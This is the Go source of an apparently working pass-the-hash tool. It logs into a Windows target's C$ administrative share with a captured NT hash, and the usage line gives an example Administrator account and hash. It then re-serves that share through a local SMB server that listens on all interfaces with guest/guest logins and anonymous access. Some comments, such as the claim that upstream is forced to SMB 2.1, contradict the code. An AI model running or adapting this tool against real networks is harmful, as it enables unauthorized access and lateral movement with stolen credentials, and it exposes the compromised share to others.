// smb-pth-proxy: browse a remote Windows share with an NT hash, no password.
//
// Architecture:
//   Windows Explorer → [local SMB server (this tool)] → [target, auth via NT hash]
//
// The local server accepts anonymous/guest connections from Explorer.
// The upstream connection authenticates via pass-the-hash.
//
// Hard limits (same as all go-smb PtH tools):
//   - Forces SMB 2.1 upstream. Targets that REQUIRE SMB signing will fail.
//   - Read-only: writes return STATUS_ACCESS_DENIED.
//   - Port 445 needs root / CAP_NET_BIND_SERVICE.
//
// Build:
//   go mod tidy && go build -o smb-pth-proxy .
//
// Usage:
//   sudo ./smb-pth-proxy \
//     -t 10.0.0.5 -u Administrator -d CORP \
//     -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \
//     -s C$
//
// Then in Windows Explorer:  \\<this-host>\share
// Or map a drive:            net use Z: \\<this-host>\share

package main

import (
	"context"
	"encoding/hex"
	"errors"
	"flag"
	"io"
	"log"
	"os"
	"os/signal"
	"runtime/debug"
	"strings"
	"sync"
	"syscall"
	"time"

	srvsvc "github.com/jfjallid/go-smb/dcerpc/mssrvs/server"
	dcesrv "github.com/jfjallid/go-smb/dcerpc/server"
	"github.com/jfjallid/go-smb/ntlmssp"
	"github.com/jfjallid/go-smb/smb"
	"github.com/jfjallid/go-smb/smb/server"
	"github.com/jfjallid/go-smb/spnego"
)

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

// filetimeToTime converts a Windows FILETIME (100-ns ticks since 1601-01-01)
// to time.Time. Returns zero when ft == 0.
func filetimeToTime(ft uint64) time.Time {
	if ft == 0 {
		return time.Time{}
	}
	const ftEpochDiff uint64 = 116444736000000000 // 100-ns ticks 1601→1970
	if ft < ftEpochDiff {
		return time.Time{}
	}
	return time.Unix(0, int64((ft-ftEpochDiff)*100)).UTC()
}

// allocSize rounds n up to the nearest 4096-byte allocation unit.
func allocSize(n int64) int64 {
	if n <= 0 {
		return 0
	}
	return ((n-1)/4096 + 1) * 4096
}

// smbBase returns the last backslash-separated component of p.
func smbBase(p string) string {
	p = strings.TrimRight(p, "\\")
	if p == "" {
		return "\\"
	}
	if i := strings.LastIndexByte(p, '\\'); i >= 0 {
		return p[i+1:]
	}
	return p
}

// remotePath strips the leading backslash so the path is suitable for
// go-smb's OpenFileExt / ListDirectory (which expect share-relative paths
// without a leading separator).
func remotePath(p string) string {
	return strings.TrimLeft(p, "\\")
}

// errToStatus maps a go-smb error to its NTSTATUS uint32 by walking
// errors.Is against the package-level StatusMap.
func errToStatus(err error) uint32 {
	if err == nil {
		return 0
	}
	for code, sentinel := range smb.StatusMap {
		if errors.Is(err, sentinel) {
			return code
		}
	}
	return smb.StatusObjectNameNotFound
}

// sharedFileAttrs reconstructs FILE_ATTRIBUTE_* bits from smb.SharedFile's
// boolean fields (the library decomposes them on parse; we recompose for
// server.FileInfo).
func sharedFileAttrs(sf smb.SharedFile) uint32 {
	var a uint32
	if sf.IsDir {
		a |= server.FileAttributeDirectory
	} else {
		a |= server.FileAttributeNormal
	}
	if sf.IsHidden {
		a |= server.FileAttributeHidden
	}
	if sf.IsReadOnly {
		a |= server.FileAttributeReadonly
	}
	if sf.IsJunction {
		a |= 0x00000400 // FILE_ATTRIBUTE_REPARSE_POINT (not in server pkg constants)
	}
	return a
}

// fixTime returns t, or now if t is the zero value.
func fixTime(t, now time.Time) time.Time {
	if t.IsZero() {
		return now
	}
	return t
}

// sharedFileToDirEntry converts a smb.SharedFile to a server.DirEntry.
func sharedFileToDirEntry(sf smb.SharedFile) server.DirEntry {
	now := time.Now()
	return server.DirEntry{
		FileInfo: server.FileInfo{
			Name:           sf.Name,
			Size:           int64(sf.Size),
			AllocationSize: allocSize(int64(sf.Size)),
			Attributes:     sharedFileAttrs(sf),
			CreationTime:   fixTime(filetimeToTime(sf.CreationTime), now),
			LastAccessTime: fixTime(filetimeToTime(sf.LastAccessTime), now),
			LastWriteTime:  fixTime(filetimeToTime(sf.LastWriteTime), now),
			ChangeTime:     fixTime(filetimeToTime(sf.ChangeTime), now),
		},
	}
}

// readAheadSize is the upstream batch size: how many bytes we fetch from the
// target in one go, both for synchronous fetches and for the async prefetch.
// It should match MaxReadSize in ServerConfig so each client READ maps to one
// upstream batch — the server sends one large response to the client while the
// goroutine fetches the next batch, hiding upstream latency entirely.
// go-smb internally caps each individual SMB2 READ to the negotiated
// MaxReadSize/credit window, so a single ReadFile call may return less than
// readAheadSize; we loop until we have the full block or hit EOF.
const readAheadSize = 8 << 20 // 8 MiB — matches ServerConfig.MaxReadSize below

// ---------------------------------------------------------------------------
// proxyHandle — implements server.Handle
//
// Each SMB CREATE from Explorer produces one proxyHandle.  It holds the
// upstream *smb.File plus the cached FileInfo the server uses for metadata
// responses (QueryFileInfo, QueryDirectory entries, etc.).
//
// For directory handles we also carry a lazy listing cursor so the server
// can call QueryDirectory repeatedly until STATUS_NO_MORE_FILES.
//
// Root-directory opens are special: the upstream share root cannot always
// be opened as a file object, so we synthesise a synthetic handle for it
// and drive listings via conn.ListDirectory instead of file.QueryDirectory.
// ---------------------------------------------------------------------------

type proxyHandle struct {
	info  server.FileInfo
	path  server.Path
	isDir bool
	file  *smb.File // nil for the synthetic root handle

	// isRoot is true for the share-root synthetic handle.
	isRoot bool

	// fileMu guards ph.file. Read acquires an RLock for the duration of each
	// upstream ReadFile call, allowing multiple concurrent reads (different
	// client connections) on the same handle. Close acquires the exclusive
	// Lock, which blocks until all in-progress reads finish, then nils ph.file
	// before calling CloseFile — ensuring no read can use a closed file.
	fileMu sync.RWMutex

	// Read-ahead cache. When the client asks for N bytes at offset X we fetch
	// readAheadSize bytes from upstream and keep the result here. Subsequent
	// reads that fall inside [cacheOff, cacheOff+len(cacheData)) are served
	// entirely from memory, eliminating the upstream round-trip for each one.
	// Current upstream cache block. One upstream fetch fills this with up to
	// readAheadSize bytes; subsequent client reads that fall inside the window
	// [cacheOff, cacheOff+len(cacheData)) are served from memory with no
	// upstream I/O. Protected by cacheMu.
	cacheMu   sync.Mutex
	cacheOff  int64
	cacheData []byte

	// Async prefetch: once the cache is half-consumed a background goroutine
	// starts fetching the next readAheadSize block. When the cache is exhausted
	// the next Read finds the prefetch done and swaps it in as the new cache,
	// hiding upstream latency entirely. Protected by prefMu.
	prefMu   sync.Mutex
	prefOff  int64         // file offset the goroutine is fetching (-1 = none)
	prefData []byte        // filled on completion (nil until then)
	prefErr  error         // non-nil means the prefetch failed
	prefDone chan struct{} // closed when goroutine finishes; nil = not started

	// Directory listing cursor (populated lazily; protected by mu).
	mu          sync.Mutex
	entries     []server.DirEntry
	pos         int
	listed      bool
	lastPattern string
}

func (h *proxyHandle) Stat() (server.FileInfo, error) { return h.info, nil }
func (h *proxyHandle) Path() server.Path              { return h.path }
func (h *proxyHandle) IsDir() bool                    { return h.isDir }

// ---------------------------------------------------------------------------
// proxyVFS — implements server.VFS
// ---------------------------------------------------------------------------

type proxyVFS struct {
	up    *smb.Connection
	share string
	// upMu serialises all calls to v.up.* methods. go-smb's Connection is
	// designed for concurrent use internally (credit tracking, pending-request
	// table), but concurrent TreeConnect / OpenFileExt / ListDirectory from
	// multiple server goroutines can race on the trees map. Holding upMu for
	// each upstream call makes the proxy safe at the cost of serialising
	// upstream I/O, which is fine: a single TCP connection to the target is
	// already serialised at the network level anyway.
	upMu sync.Mutex
}

// openOpts builds CreateReqOpts for opening a file or directory read-only.
func openDirOpts() *smb.CreateReqOpts {
	o := smb.NewCreateReqOpts()
	o.DesiredAccess = smb.DAccMaskFileListDirectory |
		smb.DAccMaskFileReadAttributes |
		smb.DAccMaskReadControl |
		smb.DAccMaskSynchronize
	o.CreateOpts = smb.FileDirectoryFile
	o.ShareAccess = smb.FileShareRead | smb.FileShareWrite | smb.FileShareDelete
	o.CreateDisp = smb.FileOpen
	return o
}

func openFileOpts() *smb.CreateReqOpts {
	o := smb.NewCreateReqOpts() // read data + attrs + control + sync
	o.ShareAccess = smb.FileShareRead | smb.FileShareWrite
	o.CreateDisp = smb.FileOpen
	return o
}

// syntheticRootHandle builds the handle returned for the share root (\).
// We don't open anything upstream here; listings go through ListDirectory.
func syntheticRootHandle(shareName string) *proxyHandle {
	now := time.Now()
	return &proxyHandle{
		info: server.FileInfo{
			Name:           shareName,
			Size:           0,
			AllocationSize: 0,
			Attributes:     server.FileAttributeDirectory,
			CreationTime:   now,
			LastAccessTime: now,
			LastWriteTime:  now,
			ChangeTime:     now,
		},
		path:   "\\",
		isDir:  true,
		isRoot: true,
		file:   nil,
	}
}

// handleFromFile builds a proxyHandle from an already-opened upstream *smb.File.
func handleFromFile(req server.CreateRequest, f *smb.File, shareName string) *proxyHandle {
	now := time.Now()
	attrs := f.Attributes
	if attrs == 0 {
		if f.IsDir() {
			attrs = server.FileAttributeDirectory
		} else {
			attrs = server.FileAttributeNormal
		}
	}
	name := smbBase(req.Path)
	if name == "\\" || name == "" {
		name = shareName
	}
	return &proxyHandle{
		info: server.FileInfo{
			Name:           name,
			Size:           int64(f.EndOfFile),
			AllocationSize: allocSize(int64(f.EndOfFile)),
			Attributes:     attrs,
			CreationTime:   fixTime(filetimeToTime(f.CreationTime), now),
			LastAccessTime: fixTime(filetimeToTime(f.LastAccessTime), now),
			LastWriteTime:  fixTime(filetimeToTime(f.LastWriteTime), now),
			ChangeTime:     fixTime(filetimeToTime(f.ChangeTime), now),
		},
		path:  req.Path,
		isDir: f.IsDir(),
		file:  f,
	}
}

// Create opens the requested path on the upstream target and returns a handle.
func (v *proxyVFS) Create(ctx context.Context, _ *server.Session, req server.CreateRequest) (result server.CreateResult, status uint32, err error) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[proxy] Create %q panic: %v\n%s", req.Path, r, debug.Stack())
			result, status = server.CreateResult{}, smb.StatusObjectNameNotFound
		}
	}()

	remote := remotePath(req.Path) // share-relative, no leading "\"

	// ---- Root directory ----
	if remote == "" {
		h := syntheticRootHandle(v.share)
		return server.CreateResult{
			Handle:       h,
			CreateAction: smb.FileOpened,
			Info:         h.info,
		}, 0, nil
	}

	wantsDir := (req.CreateOptions&smb.FileDirectoryFile) != 0 ||
		(req.FileAttributes&smb.FileAttrDirectory) != 0

	// upMu serialises all v.up.* calls — see proxyVFS comment.
	v.upMu.Lock()
	defer v.upMu.Unlock()

	var upFile *smb.File
	if wantsDir {
		upFile, err = v.up.OpenFileExt(v.share, remote, openDirOpts())
		if err != nil {
			o := openDirOpts()
			o.CreateOpts = 0
			upFile, err = v.up.OpenFileExt(v.share, remote, o)
		}
	} else {
		upFile, err = v.up.OpenFileExt(v.share, remote, openFileOpts())
		if err != nil {
			upFile, err = v.up.OpenFileExt(v.share, remote, openDirOpts())
		}
	}
	if err != nil {
		return server.CreateResult{}, errToStatus(err), nil
	}

	h := handleFromFile(req, upFile, v.share)
	return server.CreateResult{
		Handle:       h,
		CreateAction: smb.FileOpened,
		Info:         h.info,
	}, 0, nil
}

// Close releases the upstream file handle.
// The exclusive fileMu.Lock() waits for any concurrent Read (which holds
// RLock) to finish before ph.file is nilled and the upstream handle closed.
// The read-ahead cache is also cleared so its memory is released promptly.
func (v *proxyVFS) Close(_ context.Context, h server.Handle) (err error) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[proxy] Close panic: %v\n%s", r, debug.Stack())
		}
	}()
	ph := h.(*proxyHandle)

	// Exclusive lock: blocks until all in-progress RLock reads complete.
	ph.fileMu.Lock()
	file := ph.file
	ph.file = nil
	ph.fileMu.Unlock()

	// Drop the cache and wait for any in-flight prefetch goroutine to finish
	// before releasing. The goroutine will error out quickly once it sees
	// ph.file is nil (it holds only a copied pointer, not the field).
	ph.cacheMu.Lock()
	ph.cacheData = nil
	ph.cacheMu.Unlock()

	ph.prefMu.Lock()
	done := ph.prefDone
	ph.prefMu.Unlock()
	if done != nil {
		<-done
	}
	ph.prefMu.Lock()
	ph.prefData = nil
	ph.prefDone = nil
	ph.prefOff = -1
	ph.prefMu.Unlock()

	if file != nil {
		func() {
			v.upMu.Lock()
			defer v.upMu.Unlock()
			_ = file.CloseFile()
		}()
	}
	return nil
}

// Read forwards a positional read to the upstream file.
//
// Read serves data to the client using a two-level strategy:
//
//  1. Cache: one upstream fetch fills a readAheadSize block that satisfies
//     many consecutive client reads, regardless of whether the client sends
//     64 KiB or 8 MiB requests. This hides per-request overhead.
//
//  2. Async prefetch: once the cache is half-consumed a background goroutine
//     starts fetching the next block. By the time the current block is
//     exhausted the next one is waiting — zero upstream wait for the client.
//
// go-smb caps each individual ReadFile call to the upstream credit window,
// so a single call may return less than readAheadSize. Both the sync path and
// the prefetch goroutine loop until the full block is filled.
func (v *proxyVFS) Read(_ context.Context, h server.Handle, offset int64, buf []byte) (n int, status uint32, err error) {
	ph := h.(*proxyHandle)

	ph.fileMu.RLock()
	defer ph.fileMu.RUnlock()

	defer func() {
		if r := recover(); r != nil {
			log.Printf("[proxy] Read offset=%d panic: %v\n%s", offset, r, debug.Stack())
			n, status = 0, smb.FsctlStatusPipeBroken
		}
	}()

	if ph.file == nil {
		if ph.isRoot {
			return 0, smb.StatusAccessDenied, nil
		}
		return 0, smb.StatusFileClosed, nil
	}

	need := len(buf)

	// ---- tier 1: cache hit -----------------------------------------------
	ph.cacheMu.Lock()
	if ph.cacheData != nil {
		cacheOff := ph.cacheOff
		cacheLen := int64(len(ph.cacheData))
		cacheEnd := cacheOff + cacheLen
		if offset >= cacheOff && offset < cacheEnd {
			start := int(offset - cacheOff)
			avail := len(ph.cacheData) - start
			serve := avail
			if serve > need {
				serve = need
			}
			copy(buf[:serve], ph.cacheData[start:start+serve])
			// Trigger prefetch of the next block once we are past the midpoint
			// of the current block, so the goroutine runs while the remaining
			// first half is still being served.
			triggerAt := cacheOff + cacheLen/2
			nextOff := cacheEnd
			ph.cacheMu.Unlock()
			if offset+int64(serve) >= triggerAt {
				v.startPrefetch(ph, nextOff)
			}
			if serve == 0 {
				return 0, smb.StatusEndOfFile, nil
			}
			return serve, smb.StatusOk, nil
		}
	}
	ph.cacheMu.Unlock()

	// ---- tier 2: prefetch hit --------------------------------------------
	ph.prefMu.Lock()
	if ph.prefDone != nil && ph.prefOff == offset {
		done := ph.prefDone
		ph.prefMu.Unlock()
		<-done // wait if still running (usually already done)
		ph.prefMu.Lock()
		data, pErr := ph.prefData, ph.prefErr
		ph.prefData = nil
		ph.prefOff = -1
		ph.prefDone = nil
		ph.prefMu.Unlock()

		isEOF := errors.Is(pErr, io.EOF) ||
			errors.Is(pErr, smb.StatusMap[smb.StatusEndOfFile])
		if pErr != nil && !isEOF {
			return 0, errToStatus(pErr), nil
		}
		if len(data) == 0 {
			return 0, smb.StatusEndOfFile, nil
		}
		// Install prefetch result as the new cache.
		ph.cacheMu.Lock()
		ph.cacheOff = offset
		ph.cacheData = data
		ph.cacheMu.Unlock()
		// Kick off prefetch for the block after this one.
		v.startPrefetch(ph, offset+int64(len(data)))

		serve := len(data)
		if serve > need {
			serve = need
		}
		copy(buf[:serve], data[:serve])
		return serve, smb.StatusOk, nil
	}
	ph.prefMu.Unlock()

	// ---- tier 3: synchronous fetch ---------------------------------------
	// Loop ReadFile until readAheadSize bytes are accumulated or EOF is hit.
	upBuf := make([]byte, readAheadSize)
	totalN := 0
	v.upMu.Lock()
	for totalN < readAheadSize {
		rn, rErr := ph.file.ReadFile(upBuf[totalN:], uint64(offset)+uint64(totalN))
		if rn > 0 {
			totalN += rn
		}
		isEOF := errors.Is(rErr, io.EOF) ||
			errors.Is(rErr, smb.StatusMap[smb.StatusEndOfFile])
		if rErr != nil {
			if !isEOF && totalN == 0 {
				v.upMu.Unlock()
				return 0, errToStatus(rErr), nil
			}
			break
		}
		if rn == 0 {
			break
		}
	}
	v.upMu.Unlock()

	if totalN == 0 {
		return 0, smb.StatusEndOfFile, nil
	}
	// Populate cache and start prefetch for the next block.
	ph.cacheMu.Lock()
	ph.cacheOff = offset
	ph.cacheData = upBuf[:totalN]
	ph.cacheMu.Unlock()
	v.startPrefetch(ph, offset+int64(totalN))

	serve := totalN
	if serve > need {
		serve = need
	}
	copy(buf[:serve], upBuf[:serve])
	return serve, smb.StatusOk, nil
}

// startPrefetch launches a background goroutine that fetches the block at off
// from upstream. The result is stored in ph.prefData / ph.prefErr and signals
// ph.prefDone. If a prefetch is already running for any offset, this is a
// no-op — only one prefetch per handle at a time.
func (v *proxyVFS) startPrefetch(ph *proxyHandle, off int64) {
	ph.prefMu.Lock()
	if ph.prefDone != nil {
		ph.prefMu.Unlock()
		return // already running
	}
	ch := make(chan struct{})
	ph.prefDone = ch
	ph.prefOff = off
	ph.prefMu.Unlock()

	go func() {
		defer close(ch)

		// Brief RLock just to copy the file pointer safely.
		ph.fileMu.RLock()
		file := ph.file
		ph.fileMu.RUnlock()
		if file == nil {
			return
		}

		upBuf := make([]byte, readAheadSize)
		totalN := 0
		var fetchErr error

		// Hold upMu for the entire loop so the batch is atomic with respect
		// to other upstream operations (Create, QueryDirectory).
		v.upMu.Lock()
		for totalN < readAheadSize {
			rn, rErr := file.ReadFile(upBuf[totalN:], uint64(off)+uint64(totalN))
			if rn > 0 {
				totalN += rn
			}
			isEOF := errors.Is(rErr, io.EOF) ||
				errors.Is(rErr, smb.StatusMap[smb.StatusEndOfFile])
			if rErr != nil {
				if !isEOF && totalN == 0 {
					fetchErr = rErr
				}
				break
			}
			if rn == 0 {
				break
			}
		}
		v.upMu.Unlock()

		ph.prefMu.Lock()
		if totalN > 0 {
			ph.prefData = upBuf[:totalN]
		}
		ph.prefErr = fetchErr
		ph.prefMu.Unlock()
		// ch closed by defer above
	}()
}

// Write: read-only proxy; all mutations are rejected.
func (v *proxyVFS) Write(_ context.Context, _ server.Handle, _ int64, _ []byte) (int, uint32, error) {
	return 0, smb.StatusAccessDenied, nil
}

// Flush: no-op for a read-only proxy.
func (v *proxyVFS) Flush(_ context.Context, _ server.Handle) (uint32, error) {
	return 0, nil
}

// QueryDirectory lists the remote directory.
//
// Strategy: on restart=true (or first call) we fetch ALL matching entries
// from upstream in one shot and store them in the handle.  Subsequent calls
// with restart=false drain the cursor; once empty we return STATUS_NO_MORE_FILES.
// The server handles PDU-level pagination (fitting entries into response buffers)
// without needing to call us again.
//
// Root handle: uses conn.ListDirectory because there is no upstream File to
// call QueryDirectory on.
// Non-root handle: uses file.QueryDirectory directly on the open upstream file.
func (v *proxyVFS) QueryDirectory(_ context.Context, h server.Handle, pattern string, restart bool) (entries []server.DirEntry, status uint32, err error) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[proxy] QueryDirectory %q panic: %v\n%s", pattern, r, debug.Stack())
			entries, status = nil, smb.StatusObjectNameNotFound
		}
	}()

	ph := h.(*proxyHandle)
	ph.mu.Lock()
	defer ph.mu.Unlock()

	if pattern == "" {
		pattern = "*"
	}

	if restart || !ph.listed || pattern != ph.lastPattern {
		var raw []smb.SharedFile

		if ph.isRoot {
			func() {
				v.upMu.Lock()
				defer v.upMu.Unlock()
				tcErr := v.up.TreeConnect(v.share)
				if tcErr == nil {
					raw, err = v.up.ListDirectory(v.share, "", pattern)
				} else {
					err = tcErr
				}
			}()
		} else {
			if ph.file == nil {
				return nil, smb.StatusFileClosed, nil
			}
			var flags byte
			if restart {
				flags = smb.RestartScans
			}
			func() {
				v.upMu.Lock()
				defer v.upMu.Unlock()
				raw, err = ph.file.QueryDirectory(pattern, flags, 0, 65536)
			}()
		}

		if err != nil {
			if errors.Is(err, smb.StatusMap[smb.StatusNoMoreFiles]) {
				ph.listed, ph.lastPattern, ph.entries, ph.pos = true, pattern, nil, 0
				return nil, smb.StatusNoMoreFiles, nil
			}
			return nil, errToStatus(err), nil
		}

		converted := make([]server.DirEntry, len(raw))
		for i, sf := range raw {
			converted[i] = sharedFileToDirEntry(sf)
		}
		ph.entries, ph.pos, ph.listed, ph.lastPattern = converted, 0, true, pattern
	}

	if ph.pos >= len(ph.entries) {
		return nil, smb.StatusNoMoreFiles, nil
	}
	result := ph.entries[ph.pos:]
	ph.pos = len(ph.entries)
	return result, 0, nil
}

// QueryFileInfo returns StatusNotSupported so the server falls back to its own
// Stat()-driven serialization (serializeFileInfo). Returning StatusOk with a
// nil value causes "unrecognized info type <nil>" — the server only accepts
// []byte from the VFS, so nil with StatusOk is always wrong.
func (v *proxyVFS) QueryFileInfo(_ context.Context, _ server.Handle, _ byte) (any, uint32, error) {
	return nil, smb.StatusNotSupported, nil
}

// SetFileInfo: read-only proxy; reject all mutations.
func (v *proxyVFS) SetFileInfo(_ context.Context, _ server.Handle, _ byte, _ []byte) (uint32, error) {
	return smb.StatusAccessDenied, nil
}

// QueryFSInfo returns StatusNotSupported so the server uses its own defaultFsInfo
// (synthetic 16TB NTFS volume with half free). Same reasoning as QueryFileInfo.
func (v *proxyVFS) QueryFSInfo(_ context.Context, _ byte) (any, uint32, error) {
	return nil, smb.StatusNotSupported, nil
}

// QuerySecurity returns StatusNotSupported so the server substitutes its own
// world-readable security descriptor (Owner=Group=Everyone, no DACL/SACL).
func (v *proxyVFS) QuerySecurity(_ context.Context, _ server.Handle, _ uint32) ([]byte, uint32, error) {
	return nil, smb.StatusNotSupported, nil
}

// Ioctl: not implemented; the server returns STATUS_NOT_SUPPORTED.
func (v *proxyVFS) Ioctl(_ context.Context, _ server.Handle, _ uint32, _ []byte, _ uint32) ([]byte, uint32, error) {
	return nil, smb.StatusNotSupported, nil
}

// ---------------------------------------------------------------------------
// Upstream connection
// ---------------------------------------------------------------------------

// openUpstream dials the target and authenticates with the NT hash (PtH).
// hashArg accepts either:
//   - 32 hex chars (NT hash only):        "8846f7eaee8fb117ad06bdd830b7586c"
//   - LMHASH:NTHASH (impacket-style):     "aad3...04ee:8846...86c"
func openUpstream(target, user, domain, hashArg string) (*smb.Connection, error) {
	ntHex := hashArg
	if idx := strings.LastIndexByte(hashArg, ':'); idx >= 0 {
		ntHex = hashArg[idx+1:]
	}
	hashBytes, err := hex.DecodeString(ntHex)
	if err != nil {
		return nil, err
	}
	if len(hashBytes) != 16 {
		return nil, errors.New("NT hash must be exactly 16 bytes (32 hex chars)")
	}
	return smb.NewConnection(smb.Options{
		Host: target,
		Port: 445,
		// SMB2Only skips the SMB1 multi-protocol probe and sends a direct
		// SMB2 NEGOTIATE offering all dialects. The server picks the highest
		// it supports (typically SMB 3.1.1 or 3.0.2 on modern Windows).
		// Higher dialects advertise MaxReadSize = 8 MiB (vs 64 KiB for 2.1),
		// enabling go-smb to fill the 8 MiB cache in 1–2 upstream ReadFile
		// calls instead of 128, cutting upstream fetch time ~64×.
		// PtH (NT hash auth) works with all SMB2/3 dialects; signing is
		// handled correctly by go-smb's NTLMInitiator if required.
		SMB2Only: true,
		Initiator: &spnego.NTLMInitiator{
			User:   user,
			Domain: domain,
			Hash:   hashBytes,
		},
	})
}

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------

func main() {
	target := flag.String("t", "", "target SMB host IP or name (required)")
	user := flag.String("u", "", "username on target (required)")
	domain := flag.String("d", ".", "domain or workgroup ('.' = local account)")
	hashArg := flag.String("H", "", "NT hash: 32 hex OR lmhash:nthash (required)")
	share := flag.String("s", "C$", "remote share to proxy (default: C$)")
	listen := flag.String("l", "0.0.0.0:445", "local listen addr:port (port 445 needs root)")
	localShare := flag.String("share-name", "share", "share name exposed locally (\\\\host\\<this>)")
	localUser := flag.String("local-user", "guest", "username clients connect with (Windows Explorer will prompt for this)")
	localPass := flag.String("local-pass", "guest", "password clients connect with")
	flag.Parse()

	if *target == "" || *user == "" || *hashArg == "" {
		flag.Usage()
		log.Fatal("\nflags -t, -u and -H are required")
	}

	// ---- Open upstream pass-the-hash connection ----
	log.Printf("[*] connecting to \\\\%s\\%s as %s\\%s via hash...", *target, *share, *domain, *user)
	up, err := openUpstream(*target, *user, *domain, *hashArg)
	if err != nil {
		log.Fatalf("[!] upstream PtH connect failed: %v\n"+
			"    STATUS_LOGON_FAILURE   → wrong hash\n"+
			"    STATUS_ACCESS_DENIED   → wrong hash or account restrictions\n"+
			"    'signing required'     → target mandates SMB signing; PtH won't work", err)
	}
	defer up.Close()
	log.Printf("[+] upstream authenticated as %s\\%s", *domain, *user)

	// ---- Wire the proxy VFS ----
	vfs := &proxyVFS{up: up, share: *share}

	// MapAuthenticator accepts one local account (configurable via flags).
	// This is critical for Windows Explorer: AllowGuest sets SessionFlagIsGuest
	// in the SESSION_SETUP response, and Windows 10/11 silently refuses any
	// connection that returns that flag ("Block insecure guest logons" policy,
	// enabled by default). A MapAuthenticator produces a normal authenticated
	// session with no guest flag, which Windows accepts.
	//
	// ntlmssp.Ntowfv1 computes MD4(UTF-16LE(password)) — the NT hash that
	// MapAuthenticator uses to verify NTLMv2 responses.
	auth := &server.MapAuthenticator{
		// Domain: "" accepts any domain the client sends (workgroup, machine
		// name, or AD domain). Set to a specific string to restrict.
		Accounts: map[string]*server.Account{
			strings.ToLower(*localUser): {NTHash: ntlmssp.Ntowfv1(*localPass)},
		},
	}

	cfg := &server.ServerConfig{
		NetBIOSName: "SMBPROXY",
		// Pin to SMB 2.1 on both the upstream and downstream legs.
		// This eliminates SMB 3.x features (signing contexts, encryption,
		// FSCTL_VALIDATE_NEGOTIATE_INFO, leases) that the Linux kernel CIFS
		// client triggers and that we don't fully implement.
		// Linux mount: add -o vers=2.1
		MinDialect:    smb.DialectSmb_2_1,
		MaxDialect:    smb.DialectSmb_2_1,
		Authenticator: auth,
		// AllowAnonymous lets the Linux kernel CIFS client mount without
		// specifying credentials (null/anonymous session). Windows Explorer
		// always sends credentials so it goes through MapAuthenticator above.
		AllowAnonymous: true,
		// Advertise 8 MiB max read so Windows Explorer sends 8 MiB requests
		// instead of the default 64 KiB. Combined with the async prefetch
		// this eliminates per-request round-trip overhead: one upstream fetch
		// per 8 MiB, overlapped with the TCP send of the previous 8 MiB.
		MaxReadSize: readAheadSize,
	}

	srv := &server.Server{Config: cfg}

	// ---- Register the proxied disk share ----
	srv.RegisterShare(*localShare, server.Share{
		Name: *localShare,
		Type: smb.ShareTypeDisk,
		VFS:  vfs,
		// FILE_ALL_ACCESS — Explorer uses MaximalAccess to enable UI affordances
		// (copy, paste, delete buttons). The VFS still enforces read-only.
		MaximalAccess: 0x001f01ff,
	})

	// ---- Wire srvsvc so Explorer can enumerate shares at \\host level ----
	// Without this, direct UNC paths (\\host\share) still work but the host-
	// level share list and "net view \\host" fail.
	shareEntries := srvsvc.FromConfig(cfg)
	svc := &srvsvc.Service{Shares: shareEntries}
	cfg.PipeOpener = &server.MapPipeOpener{
		Pipes: map[string]func(*server.Session) (server.PipeBackend, error){
			"srvsvc": func(_ *server.Session) (server.PipeBackend, error) {
				return dcesrv.NewPipeHandler("srvsvc", svc), nil
			},
		},
	}

	log.Printf("[*] SMB proxy listening on %s", *listen)
	log.Printf("[*] Local credentials:      user=%s  pass=%s", *localUser, *localPass)
	log.Printf("[*] Connect from Explorer:  \\\\<this-host>\\%s  (enter the local credentials above)", *localShare)
	log.Printf("[*] Or map a drive:         net use Z: \\\\<this-host>\\%s /user:%s %s", *localShare, *localUser, *localPass)

	// ---- Graceful shutdown on Ctrl-C / SIGTERM ----
	go func() {
		quit := make(chan os.Signal, 1)
		signal.Notify(quit, os.Interrupt, syscall.SIGTERM)
		<-quit
		log.Println("[*] shutting down...")
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		_ = srv.Shutdown(ctx)
	}()

	if err := srv.ListenAndServe(*listen); err != nil && !errors.Is(err, server.ErrServerClosed) {
		log.Fatalf("[!] server error: %v", err)
	}
}
